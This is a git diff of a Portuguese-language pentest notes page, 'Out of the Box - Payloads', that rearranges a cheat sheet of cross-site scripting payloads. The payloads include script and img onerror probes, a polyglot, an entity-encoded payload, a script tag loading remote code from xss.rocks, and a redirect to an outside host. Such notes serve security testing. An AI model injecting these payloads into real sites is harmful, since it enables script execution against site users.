@@ -1,6 +1,6 @@
 ---
 title: Out of the Box - Payloads
-date: 2022-07-23 00:00:00
+date: 2023-10-28 00:00:00
 ---
 
 ## Payload Lists
@@ -28,7 +28,15 @@ Null = %00
 
 XSS Ideas
 ```
+Básicos e preferidos:
+<script>alert(1)</script>
+<script>alert(1)//
+<script src="http://xss.rocks/xss.js"></script>
+<img src/onerror=alert(1)> 
+<a href="javascript:alert(1)"></a>
+
 XSS poliglota:
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 Cross Site Scripting (XSS) Akamai WAF Bypass
@@ -41,17 +49,12 @@ XSS fazendo um ssrf:.
 <script>window.location="http://endereço.."</script>
 
 Others:
-<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
-<img src/onerror=alert(1)>
-<a href="javascript:alert(1)"></a>
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 ```
 
 ```javascript
 jQuery Version:
 alert(jQuery.fn.jquery);
-
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
 
 Angular Template Injection:
